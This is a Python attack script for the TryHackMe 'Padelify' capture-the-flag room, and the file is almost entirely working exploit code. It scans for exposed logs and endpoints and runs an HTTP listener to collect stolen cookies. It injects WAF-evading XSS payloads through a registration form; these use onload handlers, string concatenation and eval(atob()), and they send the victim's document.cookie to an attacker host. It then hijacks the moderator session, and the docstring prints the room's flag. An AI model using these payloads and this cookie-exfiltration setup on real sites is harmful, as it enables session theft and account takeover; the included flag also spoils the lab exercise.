#!/usr/bin/env python3
"""
Padelify TryHackMe – Flag 1: Moderator Cookie Theft via XSS + WAF Bypass

Attack flow:
  1. Recon: Read /logs/error.log to confirm XSS is only warned (not blocked)
  2. Start HTTP listener on AttackBox to catch stolen cookies
  3. Register with XSS payload in username field – moderator reviews it manually
  4. WAF blocks <script>, document.cookie, <img onerror> directly
     → Use <iframe onload> with document['coo'+'kie'] concatenation trick
     → Alternative: <body onload="eval(atob(...))"> with base64-encoded fetch
  5. Moderator triggers XSS → cookie exfiltrated to our listener
  6. Use stolen PHPSESSID to access moderator dashboard → Flag 1

Usage:
  # Step 1: Run recon only
  python padelify_first.py --target 10.82.156.227 --recon-only

  # Step 2: Full attack – starts listener + injects XSS + waits for cookie + grabs flag
  python padelify_first.py --target 10.82.156.227 --attackbox 10.82.66.140 --port 8000

  # Step 3: If you already have the cookie, skip XSS and just grab the flag
  python padelify_first.py --target 10.82.156.227 --cookie "PHPSESSID=abc123..."

  THM{Logged_1n_Moderat0r}
"""

from __future__ import annotations

import argparse
import base64
import http.server
import re
import socketserver
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

# ── Globals ──────────────────────────────────────────────────────────────────
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
STOLEN_COOKIE: str | None = None
COOKIE_EVENT = threading.Event()


# ── HTTP helpers ─────────────────────────────────────────────────────────────
def get(url: str, cookies: str = "", timeout: float = 10) -> tuple[int, str]:
    """GET request with realistic User-Agent (bypasses WAF UA check)."""
    headers = {"User-Agent": UA}
    if cookies:
        headers["Cookie"] = cookies
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.getcode(), resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        body = e.read(4096).decode("utf-8", errors="replace") if e.fp else ""
        return e.code, body
    except Exception as e:
        return 0, str(e)


def post_form(url: str, data: dict, cookies: str = "", timeout: float = 10) -> tuple[int, str]:
    """POST form-encoded data with realistic UA."""
    headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    if cookies:
        headers["Cookie"] = cookies
    body = urllib.parse.urlencode(data).encode("utf-8")
    req = urllib.request.Request(url, data=body, method="POST", headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.getcode(), resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        body_text = e.read(4096).decode("utf-8", errors="replace") if e.fp else ""
        return e.code, body_text
    except Exception as e:
        return 0, str(e)


# ── Recon ────────────────────────────────────────────────────────────────────
def recon(target: str) -> None:
    """Enumerate interesting endpoints."""
    base = f"http://{target}"
    print("\n" + "=" * 60)
    print("[RECON] Starting enumeration")
    print("=" * 60)

    # Check main page
    code, body = get(base)
    print(f"\n[+] GET / → {code}  ({len(body)} bytes)")
    if "register" in body.lower() or "sign up" in body.lower():
        print("    → Registration form detected")
    if "PHPSESSID" in body or "phpsessid" in body.lower():
        print("    → PHPSESSID cookie in use")

    # Check known dirs/files
    paths = [
        "/logs/",
        "/logs/error.log",
        "/config/",
        "/config/app.conf",
        "/login",
        "/login.php",
        "/register",
        "/register.php",
        "/dashboard",
        "/dashboard.php",
        "/admin",
        "/admin.php",
    ]
    for path in paths:
        code, body = get(f"{base}{path}")
        status = "OK" if code == 200 else f"{code}"
        extra = ""
        if code == 200 and len(body) > 50:
            preview = body[:300].replace("\n", " ").strip()
            extra = f"  preview: {preview[:120]}..."
        print(f"[+] GET {path:30s} → {status}{extra}")

    # Read error.log specifically
    code, body = get(f"{base}/logs/error.log")
    if code == 200 and body.strip():
        print(f"\n{'─' * 60}")
        print("[!] error.log contents:")
        print("─" * 60)
        print(body[:2000])
        print("─" * 60)

    print("\n[RECON] Done.\n")


# ── Cookie listener ─────────────────────────────────────────────────────────
class CookieHandler(http.server.BaseHTTPRequestHandler):
    """Catches exfiltrated cookies from XSS callback."""

    def do_GET(self):
        global STOLEN_COOKIE
        parsed = urllib.parse.urlsplit(self.path)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        cookie_val = qs.get("c", [""])[0] or qs.get("x", [""])[0]
        src = f"{self.client_address[0]}:{self.client_address[1]}"

        if cookie_val and not STOLEN_COOKIE:
            STOLEN_COOKIE = cookie_val
            print(f"\n{'=' * 60}")
            print(f"[!!!] COOKIE STOLEN from {src}")
            print(f"[!!!] Cookie: {STOLEN_COOKIE}")
            print(f"{'=' * 60}\n")
            COOKIE_EVENT.set()

        # Also log any other callbacks (img loads etc.)
        if self.path != "/favicon.ico":
            print(f"[listener] {src} → {self.path[:200]}")

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, fmt, *args):
        return  # suppress default logging


def start_listener(host: str, port: int) -> socketserver.TCPServer:
    """Start HTTP exfil listener in background thread."""
    server = socketserver.ThreadingTCPServer((host, port), CookieHandler)
    server.daemon_threads = True
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    print(f"[listener] Started on {host}:{port}")
    return server


# ── XSS Payloads ────────────────────────────────────────────────────────────
def build_payloads(attackbox: str, port: int) -> list[tuple[str, str]]:
    """
    Multiple WAF-bypass XSS payloads, ordered by likelihood of success.
    Returns list of (name, payload) tuples.
    """
    callback = f"http://{attackbox}:{port}"
    payloads = []

    # 1. <iframe onload> with string concatenation to bypass 'cookie' filter
    #    This is confirmed working in the infosecwriteups writeup
    p1 = (
        f"""<iframe onload="new Image().src='{callback}/?c='+document['coo'+'kie']">"""
    )
    payloads.append(("iframe+onload+concat", p1))

    # 2. <body onload> with eval(atob(...)) – confirmed in domoon writeup
    #    base64 of: fetch('http://ATTACKBOX:PORT/?c='+document.cookie)
    js_code = f"fetch('{callback}/?c='+document.cookie)"
    b64 = base64.b64encode(js_code.encode()).decode()
    p2 = f"""<body onload="eval(atob('{b64}'))">"""
    payloads.append(("body+eval+atob", p2))

    # 3. <iframe> with eval(atob()) – combines both bypass techniques
    js_code2 = f"new Image().src='{callback}/?c='+document['coo'+'kie']"
    b64_2 = base64.b64encode(js_code2.encode()).decode()
    p3 = f"""<iframe onload="eval(atob('{b64_2}'))">"""
    payloads.append(("iframe+eval+atob+concat", p3))

    # 4. <svg onload> variant
    p4 = f"""<svg onload="new Image().src='{callback}/?c='+document['coo'+'kie']">"""
    payloads.append(("svg+onload+concat", p4))

    return payloads


# ── Registration / XSS injection ────────────────────────────────────────────
def find_register_url(target: str) -> str | None:
    """Try to find the registration endpoint."""
    base = f"http://{target}"
    candidates = ["/register.php", "/register", "/", "/index.php", "/signup.php"]
    for path in candidates:
        code, body = get(f"{base}{path}")
        if code == 200 and ("register" in body.lower() or "sign up" in body.lower()):
            # Try to find the form action
            m = re.search(r'action=["\']([^"\']+)["\']', body, re.I)
            if m:
                action = m.group(1)
                if not action.startswith("http"):
                    action = f"{base}{action}" if action.startswith("/") else f"{base}/{action}"
                print(f"[+] Found registration form → action={action}")
                return action
            # If no action, the form posts to itself
            print(f"[+] Found registration form at {path} (posts to self)")
            return f"{base}{path}"
    return None


def find_form_fields(target: str, url: str) -> list[str]:
    """Parse form fields from the registration page."""
    code, body = get(url)
    if code != 200:
        return []
    # Find all input fields
    fields = re.findall(r'name=["\']([^"\']+)["\']', body, re.I)
    print(f"[+] Form fields found: {fields}")
    return fields


def inject_xss(target: str, payload: str, register_url: str) -> bool:
    """Submit registration form with XSS payload in the username field."""
    base = f"http://{target}"

    # First, get the page to find a session cookie and form fields
    headers = {"User-Agent": UA}
    req = urllib.request.Request(register_url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            resp_cookies = resp.headers.get_all("Set-Cookie") or []
    except Exception as e:
        print(f"[!] Failed to load register page: {e}")
        return False

    # Extract PHPSESSID from response
    session_cookie = ""
    for c in resp_cookies:
        if "PHPSESSID" in c:
            session_cookie = c.split(";")[0]
            break

    # Parse form fields
    fields = re.findall(r'name=["\']([^"\']+)["\']', body, re.I)
    print(f"[+] Form fields: {fields}")

    # Build form data – inject XSS into username/name field
    form_data = {}
    for field in fields:
        fl = field.lower()
        if fl in ("username", "name", "user", "fullname", "full_name", "player_name", "player"):
            form_data[field] = payload
            print(f"[+] Injecting XSS into field: {field}")
        elif fl in ("email", "mail"):
            form_data[field] = f"xss_test_{int(time.time())}@test.com"
        elif fl in ("password", "pass", "passwd"):
            form_data[field] = "Test1234!"
        elif fl in ("confirm_password", "password2", "confirm"):
            form_data[field] = "Test1234!"
        elif fl in ("phone", "telephone", "tel"):
            form_data[field] = "+1234567890"
        else:
            form_data[field] = payload  # put payload in unknown fields too

    if not form_data:
        # Fallback: guess common field names
        form_data = {
            "username": payload,
            "email": f"xss_{int(time.time())}@test.com",
            "password": "Test1234!",
        }
        print("[!] No fields detected, using guessed field names")

    print(f"[+] Submitting registration with XSS payload...")
    code, resp_body = post_form(register_url, form_data, cookies=session_cookie)
    print(f"[+] Registration response: {code}")

    if code == 200:
        if "moderator" in resp_body.lower() or "review" in resp_body.lower() or "pending" in resp_body.lower():
            print("[+] Registration submitted for moderator review!")
            return True
        elif "success" in resp_body.lower() or "submitted" in resp_body.lower():
            print("[+] Registration submitted successfully!")
            return True
        else:
            preview = resp_body[:500].replace("\n", " ")
            print(f"[?] Response preview: {preview}")
            return True  # might still work
    elif code == 403:
        print("[!] WAF BLOCKED this payload (403 Forbidden)")
        return False
    else:
        preview = resp_body[:300].replace("\n", " ")
        print(f"[!] Unexpected response {code}: {preview}")
        return False


# ── Grab flag with stolen cookie ────────────────────────────────────────────
def grab_moderator_flag(target: str, cookie: str) -> str | None:
    """Use the moderator's cookie to access the dashboard and grab the flag."""
    base = f"http://{target}"
    print(f"\n[+] Using stolen cookie to access moderator dashboard...")

    # Ensure cookie format
    if not cookie.startswith("PHPSESSID="):
        cookie = f"PHPSESSID={cookie}"

    # Try common dashboard paths
    paths = ["/dashboard", "/dashboard.php", "/", "/index.php",
             "/admin", "/admin.php", "/panel", "/panel.php",
             "/moderator", "/moderator.php", "/home", "/home.php"]

    for path in paths:
        code, body = get(f"{base}{path}", cookies=cookie)
        if code == 200:
            # Look for flag pattern THM{...} or flag{...}
            flags = re.findall(r'(?:THM|flag)\{[^}]+\}', body, re.I)
            if flags:
                print(f"\n{'=' * 60}")
                print(f"[!!!] FLAG FOUND at {path}:")
                for f in flags:
                    print(f"      {f}")
                print(f"{'=' * 60}")
                return flags[0]
            if "dashboard" in body.lower() or "moderator" in body.lower() or "welcome" in body.lower():
                print(f"[+] {path} → Authenticated page ({len(body)} bytes)")
                # Print relevant portion
                preview = body[:2000]
                print(f"    Preview: {preview[:500]}")

    # Also try changing password as suggested in writeup
    print("[+] Trying to find flag in full page source...")
    for path in paths:
        code, body = get(f"{base}{path}", cookies=cookie)
        if code == 200 and len(body) > 100:
            # Search more broadly
            for line in body.split("\n"):
                if re.search(r'THM\{|flag\{|ctf\{', line, re.I):
                    print(f"[!!!] Flag line: {line.strip()}")
                    flag = re.search(r'(?:THM|flag|ctf)\{[^}]+\}', line, re.I)
                    if flag:
                        return flag.group(0)

    print("[!] No flag found yet – check the cookie and dashboard manually")
    print(f"[i] Cookie to use in browser: {cookie}")
    return None


# ── Main ─────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Padelify Flag 1: Steal moderator cookie via XSS + WAF bypass"
    )
    parser.add_argument("--target", default="10.82.156.227", help="Target IP")
    parser.add_argument("--attackbox", default="10.82.66.140", help="Your AttackBox/listener IP")
    parser.add_argument("--port", type=int, default=8000, help="Listener port (default: 8000)")
    parser.add_argument("--recon-only", action="store_true", help="Only run recon, no exploit")
    parser.add_argument("--cookie", help="Skip XSS, use this cookie directly to grab flag")
    parser.add_argument("--payload-index", type=int, default=-1,
                        help="Use specific payload index (0-3), or -1 to try all")
    parser.add_argument("--wait", type=int, default=120,
                        help="Seconds to wait for moderator to trigger XSS (default: 120)")
    args = parser.parse_args()

    # ── Step 0: Recon ──
    recon(args.target)

    if args.recon_only:
        print("[i] Recon-only mode, exiting.")
        return

    # ── Step 1: If cookie provided, skip to flag grab ──
    if args.cookie:
        grab_moderator_flag(args.target, args.cookie)
        return

    # ── Step 2: Find registration URL ──
    register_url = find_register_url(args.target)
    if not register_url:
        print("[!] Could not find registration form. Check target manually.")
        return

    # ── Step 3: Build payloads ──
    payloads = build_payloads(args.attackbox, args.port)
    print(f"\n[+] Built {len(payloads)} XSS payloads:")
    for i, (name, p) in enumerate(payloads):
        print(f"    [{i}] {name}: {p[:100]}...")

    # ── Step 4: Start listener ──
    print(f"\n[+] Starting cookie listener on 0.0.0.0:{args.port}")
    print(f"    Callback URL: http://{args.attackbox}:{args.port}/")
    server = start_listener("0.0.0.0", args.port)

    # ── Step 5: Inject XSS payloads ──
    if args.payload_index >= 0:
        indices = [args.payload_index]
    else:
        indices = list(range(len(payloads)))

    any_success = False
    for i in indices:
        name, payload = payloads[i]
        print(f"\n{'─' * 60}")
        print(f"[+] Trying payload [{i}]: {name}")
        print(f"    Payload: {payload[:150]}")
        print(f"{'─' * 60}")
        success = inject_xss(args.target, payload, register_url)
        if success:
            any_success = True
            print(f"[+] Payload [{i}] submitted OK")
        else:
            print(f"[!] Payload [{i}] was blocked/failed")

        if STOLEN_COOKIE:
            break  # already got cookie

        # Brief pause between attempts
        time.sleep(2)

    if not any_success:
        print("\n[!] All payloads were blocked. Try manually or craft a new bypass.")
        server.shutdown()
        return

    # ── Step 6: Wait for moderator to trigger XSS ──
    if not STOLEN_COOKIE:
        print(f"\n[+] Waiting up to {args.wait}s for moderator to review registration...")
        print("[+] The moderator periodically checks new registrations.")
        print("[+] Cookie will appear here when captured.\n")

        COOKIE_EVENT.wait(timeout=args.wait)

    if STOLEN_COOKIE:
        print(f"\n[+] Got cookie: {STOLEN_COOKIE}")
        grab_moderator_flag(args.target, STOLEN_COOKIE)
    else:
        print("\n[!] Timeout – no cookie received.")
        print("[i] Possible issues:")
        print("    - AttackBox IP not reachable from target?")
        print("    - Firewall blocking incoming connections?")
        print("    - WAF blocked the payload silently?")
        print("    - Try a different payload with --payload-index 0/1/2/3")
        print(f"\n[i] Listener still running on :{args.port}, press Ctrl+C to stop")
        try:
            while True:
                time.sleep(5)
                if STOLEN_COOKIE:
                    grab_moderator_flag(args.target, STOLEN_COOKIE)
                    break
        except KeyboardInterrupt:
            pass

    server.shutdown()


if __name__ == "__main__":
    main()
